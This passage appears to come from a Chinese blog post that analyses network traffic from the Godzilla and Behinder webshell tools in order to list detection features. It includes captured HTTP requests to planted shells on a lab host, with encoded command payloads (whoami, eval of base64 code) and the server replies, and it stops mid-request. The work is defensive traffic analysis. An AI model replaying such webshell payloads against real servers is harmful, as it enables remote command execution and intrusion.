+</span></span><span class="line"><span class="cl">c91a1042cfa507=y5Y2QgL2QgIkM6L0pzcHN0dWR5L3RvbWNhdC9iaW4iJndob2FtaSZlY2hvIDcyMjYwNmJkNjU1YiZjZCZlY2hvIDAwMTJjMmU0MWY%3D&amp;iaf40aaecc6976=Dh&amp;passwd=yv66vgAAADEBgwoAZgCiCQCCAKMJAIIApAgApQkAggCmCACnCQCCAKgIAKkJAIIAqgoAggCrBwCsCgALAKIIAK0IAK4IAK8IALAIALEIALIIALMLAGAAtAsAXwC1CwBgALULAF8AtgoAggC3CQCCALgKAIIAuQoACwC6BwC7BwC8CgAdAKIIAL0KAB0AvgoAHAC%2FCgAdAL8LAGAAwAoACwC%2FCgCCAMEKAMIAwwoAxADFCgA3AMYIAMcKADcAyAgAyQgAygoANwDLBwDMCgA3AM0KAC4AzgoANwDPCgA3ANAKAB0A0QgA0goALgDTCgAuANQHANUKAIIA1goANwDXCgCCANgIANkIANoKANsA3AcA3QoAPgDeCADfCgA3AOAIAOELAOIA4wsA4gDkCwDiAOULAOYA5wsA6ADpCwDoAOoIAOsLAOIA7AoA7QDuCgDtAO8KAPAA8QoAggDyCgDwAPMIAPQKANsA9QoANwD2CAD3CgA3APgHAPkHAPoKAFYA%2BwoAVQD8CgBVAP0IAP4KAFUA%2FwoAZgEACgBkAQEHAQIHAQMHAQQIAQUKAGQBBggBBwcBCAoAZAEJBwEKCgELAQwIAQ0IAIMKAGQBDgoBDwEQ...............
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 08:06:19 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17
+</span></span><span class="line"><span class="cl">Set-Cookie: JSESSIONID=0F95EEF71FACC7B91F36CC28C4422E50; Path=/; HttpOnly
+</span></span><span class="line"><span class="cl">Content-Type: text/html;charset=UTF8
+</span></span><span class="line"><span class="cl">Content-Length: 104
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">40ef7330774dwin-dobbdd1n0d6\administrator
+</span></span><span class="line"><span class="cl">722606bd655b
+</span></span><span class="line"><span class="cl">C:\Jspstudy\tomcat\bin
+</span></span><span class="line"><span class="cl">0012c2e41f
+</span></span><span class="line"><span class="cl">0a60f2ce1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li><strong>强特征：执行的命令在返回包中明文传输</strong></li>
+<li><strong>请求包参数中存在WebShell的连接密码，并且没有进行加密</strong></li>
+</ol>
+<h2 id="2哥斯拉40">2.哥斯拉4.0
+</h2><h3 id="21php_eval_xor_base64模式流量特征">2.1.Php_EVAL_XOR_BASE64模式流量特征
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s/VPWLGL6Ild9VpC2jeqM_dA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/VPWLGL6Ild9VpC2jeqM_dA</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/hIpobgYkfwNM06rKZZHOhA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/hIpobgYkfwNM06rKZZHOhA</a></p>
+<p><strong>连接上WebSHell后主要进行了命令执行，文件上传，文件下载，文件修改和连接本地数据库</strong></p>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.png"
+	width="2560"
+	height="804"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2_hu_8e39e6e6cd3beef9.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2_hu_6f3e860b28fd027b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="318"
+		data-flex-basis="764px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /gsl.php HTTP/1.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 53767
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pass=
+</span></span><span class="line"><span class="cl">GIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWb
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>特征有以下</p>
+<ol>
+<li><strong><font style="color:#DF2A3F;">Connection显示为Keep-alive，表示为长连接</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">连接Webshell时Content-Length长度特别大53767，一般请求包长度没有这么大</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">传输数据中显示WebShell连接密码为pass，存在危险函数eval</font></strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">pass=eval(base64_decode(strrev(urldecode(&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li><strong><font style="color:#DF2A3F;">返回包数据是无规律的加密字符串，但是返回包字符串中==后都会跟着一串相同的字符串，状态码为200</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">返回包中存在PhpSessionID</font></strong></li>
+</ol>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.png"
+	width="1566"
+	height="713"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3_hu_18d7c2d2194d8cd.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3_hu_a886781fb7134355.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="527px"
+	
+></p>
+<h3 id="22单纯php_base64加密">2.2.单纯php_base64加密
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /gsl64.php HTTP/1.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=cho3pe4isrirht2omuo3p05oct;
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 113
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pass=fL1tMGI4YTljMf5%2FH%2F2pfJJ9qX0HWgZZA3l6H0P%2FrXou%2F0kyafFjvP%2BcwTkAPut4KWVP0e7A45sfzMXCQklhCG3Seg9iOGE%3D
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 06:31:29 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.4
+</span></span><span class="line"><span class="cl">Expires: Thu, 19 Nov 1981 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Set-Cookie: PHPSESSID=cho3pe4isrirht2omuo3p05oct; path=/
+</span></span><span class="line"><span class="cl">Keep-Alive: timeout=5, max=96
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">11cd6a8758984163fL1tMGI4YTljO0Ch/0aDA3OyqtJLRKhoJQLPg5ZvC4qNEywlGZtBb2Ek9Rz5ENF83BVcqOccVvOdDebh7wAOoDxIv5654H7TsMlW40T5FQ38ecKj2f8y1aBf41/s93wgbzMPHm4/OjkZkAlYSM5RrCN/OgMquIX7ERA+045mfzdgQl8BLYsHgBs2HW/LQ1LxYz9j3ffOMwo3N6mi9Ibm+jCFGq2/NwoK++cPvdKxeuVNGQ559d5BMxk6/1lWXHOCmajFReSmBNu3H1Zu5sEATBayhNhws0OIsdVE/YnOY5pfhk+waswJoPFIV9qIklr4LUXjyz56U8l5hmKA+mQ0F7bgbvmGoVDT9YO8oPCXAoXxP77ciUhN7p5frgtCaNlfC9DxVUp9FDjcW6LWJzGk86K22AS94yHIs3gskMWLLsSWWNZnxxWUYe/ga3M8B4SzAX4d5353Nnp2dqZz0R1Hc/A9tw3lI+C7Z+tZOdcdPLVth8pzHtsxa/DJpH4485H2RzbKBWE1t9DP0/oWnPcXSEaVh9BokDMNuQD5DPfs3G/Knt3wBis3p/91oH3Yd430ARR4pHCudKwGec3iXK8EzhwxlxVwBR1PgxKZpF9Psn3Xs1X5XOKFdcYO9Od9FJw0bmWP/IczdnrC9uixzP4Kep+Gni8pnAs3mjI1Mg==6c37ac826a2a04bc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>大体和php_EVAL_XOR_Base64差不多，只是数据包中不存在这个函数eval和base64Decode这两个函数</strong></p>
+<h3 id="23java_"><strong>2.3.Java_AES_BASE64模式</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /gsl.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=A80ED3542DB7B279B78BB97B7CEFE172;
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 73
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 06:43:00 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17
+</span></span><span class="line"><span class="cl">Content-Type: text/html;charset=ISO-8859-1
+</span></span><span class="line"><span class="cl">Content-Length: 76
+</span></span><span class="line"><span class="cl">Keep-Alive: timeout=5, max=99
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>和php的流量特征及其相似，不管是请求包还是返回包，JSP的哥斯拉返回包没有phpsessionID这个字段，但是明文webshell连接密码还是存在</strong></p>
+<p><strong>总结：哥斯拉流量特征主要有以下几个方面</strong></p>
+<ol>
+<li><strong>强特征1：连接均采用长连接（Keep-ALive）</strong></li>
+<li><strong>强特征2：WebShell连接密码明文显示在请求包中，默认为pass</strong></li>
+<li><strong>强特征3：对应php的哥斯拉，返回包存在phpsessionID字段，JSP的没有</strong></li>
+<li><strong>强特征4：返回包密文最后结尾总是一串16位的md5值（6C37AC826A2A04BC）</strong></li>
+</ol>
+<h2 id="3哥斯拉特战版二开的哥斯拉">3.哥斯拉特战版（二开的哥斯拉）
+</h2><p><strong>项目地址：</strong><a class="link" href="https://github.com/ekkoo-z/Z-Godzilla_ekp"  target="_blank" rel="noopener"
+    ><strong>https://github.com/ekkoo-z/Z-Godzilla_ekp</strong></a></p>
+<h3 id="31java_"><strong>3.1.JAVA_AES_RAW_BASE64模式</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /gslshell.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=ABD1AB4546483A638A9C96E4C4373A07
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Content-Length: 64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0mQU+S1pFnTz3ttVTnAgJVD/aBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 07:13:23 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17
+</span></span><span class="line"><span class="cl">Content-Type: text/xml;charset=UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: 122
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">8BB3709BB1B23E80V+RK7jG2F/1Yj1Tg/3uyr09T21aOsG3Md1eladPmEKaKpejnv0tGhDPtGzFDjYTCNLG9WNAwDUBX
+</span></span><span class="line"><span class="cl">KrL66qwWdQ==F6943A54B7703F5F
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>相较于原始版本的哥斯拉，特战版本哥斯拉几乎将强特征全部隐藏了，与原始版本哥斯拉不同点在于</p>
+<ol>
+<li><strong>Content-Type类型变成了application/octet-stream</strong></li>
+<li><strong>请求头字段可以自己设置</strong></li>
+<li><strong>在Cookie中新增了JSESSIONID</strong></li>
+<li><strong>但是返回包末尾的16位md5值没有改变，依旧存在</strong></li>
+</ol>
+<h2 id="4冰蝎">4.冰蝎
+</h2><h3 id="41冰蝎3jsp默认下流量特征">4.1.冰蝎3&mdash;JSP&mdash;默认下流量特征
+</h3><p><strong>由于冰蝎和哥斯拉都可以自定义请求头，所以光看请求头并不能确保100%是对应的流量，在此讨论的是默认状态下冰蝎3的流量特征</strong></p>
+<ol>
+<li><strong>请求头中包含Cookie字段，值为JSESSIONID</strong></li>
+<li><strong>请求头中Connection为长连接，从请求头来看和哥斯拉很像</strong></li>
+<li><strong>请求体内容中不存在敏感函数和连接密码，但是返回包中字段内容很特殊，由很多点?等特殊字符组成，不像其它WebSHell一样是一串字符串或者是明文</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /beyond.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream
+</span></span><span class="line"><span class="cl">Referer: http://192.168.100.133/beyond.jsp
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-Length: 9196
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=E7EBE85F325DA037345274E855AC2BB9;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DwTyi2tOkoUj0XJVagEtJ3znCXjy0giLcAQ8qq0p1b17r0qDueXrcIKCYfyBuyJJbXMntG4z46O4p5DcJpgOt/Bkw5g7sZt+Czuqj6BhzR2N2J0iA5iqOxT4+pPrOAzbeeLARy7GgcknRACWoceMRF8onIBG8ceY21mD1X3ynE6aBaX7zoeCigO/wc/ygw5QUq4vDTLFNKQRx232qyLQP588v12r/owpM5FRoH4IRlSZ/NIGhnlVfe8SyEDRnIif+q2vL1+qZpkLqAlBA9rPwhj6/CwCqU5R5iS7U3U25FsUjgqTKpiihB7Icl/n6pwECMs3QjZTRkNn5zbKZCSiJtk14FyhCcz4kwl6sZSrby6BGQhIRpHN+gNSh4vvYQ6/CFn6GJybl/k9DwvCYTO065OSTivNzKqbuw8ozDyvFazRH2+EHjAAoTO6bAsjZiEjEZm/oppqxS4Zv6o8gxuW0C25yiiVZjRcB/MoRESgC9V7awIX0xO/MW0LUgZzD8dqufLEqfcEykzPf3RT67YGU5qO6t98qwidRnLWmvGw+Fc2r0MbNzYkAPW7N5zNPS83bQgcRO1unC+nnNNXVKXOR/fVs2BDjYsceyY9sD2V7AYXBHRrujuUMeYFbEjngSQB2q/KvSHX4XSFxpTP/utE+eSrMw6Xz/MPJE91jz2/aRA38dOBr8S/z3JgVpmgMwPsJk+CqJVle1Suv+h8sprfF62qUjikUv1ZhE75Va/MsOhxyQrjKROISK0ebexAxp+rQGCQmwCs+8WHk5FocTkcK9c8Qw3jiZ4kl5TedFltnXNtZ8BuW0h7/be0d9UP04Pt235FEzXYgsDlw1tnQcgu6FJDFlR1Nw06z7viyfMMpwP/+Yg31nwfPQHqec1k61fu+.............................
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 12:08:49 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17
+</span></span><span class="line"><span class="cl">Content-Type: text/html;charset=UTF-8
+</span></span><span class="line"><span class="cl">Keep-Alive: timeout=5, max=100
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.../9.....L..[.....-..m.c.,&amp;.*K......=.?......x............}Y......S_...?..S@.&amp;.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.png"
+	width="1649"
+	height="881"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4_hu_76348124fd44567d.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4_hu_27eceab348197edd.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="449px"
+	
+></p>
+<h3 id="42冰蝎3php默认下流量特征">4.2.冰蝎3&mdash;PHP&mdash;默认下流量特征
+</h3><ol>
+<li><strong>请求头中包含PHPSESSIONID/Cache-Control等字段</strong></li>
+<li><strong>请求体中不存在敏感字符，都是AES+BASE64加密的字符</strong></li>
+<li><strong>Php返回包为一串字符串，没有特殊符号</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /beyond.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+</span></span><span class="line"><span class="cl">Content-type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Referer: http://192.168.100.133/beyond.php
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-Length: 5760
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=6j0pvmbidjuf9rdese2t6bp5fb;PHPSESSID=6j0pvmbidjuf9rdese2t6bp5fb
+</span></span><span class="line"><span class="cl">
